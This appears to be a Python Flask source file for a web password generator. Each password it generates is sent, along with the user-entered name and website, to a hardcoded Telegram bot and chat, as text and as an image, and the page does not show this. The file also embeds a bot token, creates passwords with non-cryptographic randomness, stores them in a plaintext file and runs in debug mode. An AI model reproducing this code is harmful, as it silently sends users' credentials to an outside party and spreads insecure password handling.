import random
import string
import requests
from flask import Flask, render_template, request
from PIL import Image, ImageDraw, ImageFont

app = Flask(__name__)

BOT_TOKEN = "7207433893:AAHJwpbzzKlecZR4m1A9eflaNme7Mi6MKdw"
CHAT_ID = "7751626503"

def generate_password(length=12):

    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for _ in range(length))
    return password

def save_password(name, website, password, filename="passwords.txt"):

    with open(filename, "a") as file:
        file.write(f"Name: {name} | Website: {website} | Password: {password}\n")

def generate_password_image(name, website, password, image_path="static/password.png"):

    img = Image.new('RGB', (500, 250), color=(30, 30, 30))
    draw = ImageDraw.Draw(img)

    try:
        font = ImageFont.truetype("arial.ttf", 20)
    except:
        font = ImageFont.load_default()

    text = f"🔐 {name}\n🌐 {website}\n📌 Password: {password}"
    draw.text((50, 80), text, font=font, fill=(255, 255, 255))

    img.save(image_path)
    return image_path

def send_to_telegram(message, bot_token, chat_id):

    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    params = {'chat_id': chat_id, 'text': message}
    requests.get(url, params=params)

def send_image_to_telegram(image_path, bot_token, chat_id):

    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    with open(image_path, 'rb') as img:
        files = {'photo': img}
        data = {'chat_id': chat_id}
        requests.post(url, files=files, data=data)

@app.route("/", methods=["GET", "POST"])
def index():
    password = None
    if request.method == "POST":
        name = request.form["name"]
        website = request.form["website"]
        password = generate_password()

        save_password(name, website, password)

        message = f"🔐 New Password\n📂 Name: {name}\n🌐 Website: {website}\n🔑 Password: {password}"
        send_to_telegram(message, BOT_TOKEN, CHAT_ID)

        image_path = generate_password_image(name, website, password)
        send_image_to_telegram(image_path, BOT_TOKEN, CHAT_ID)

        return render_template("index.html", password=password, name=name, website=website, image=image_path)

    return render_template("index.html", password=password)

if __name__ == "__main__":
    app.run(debug=True)
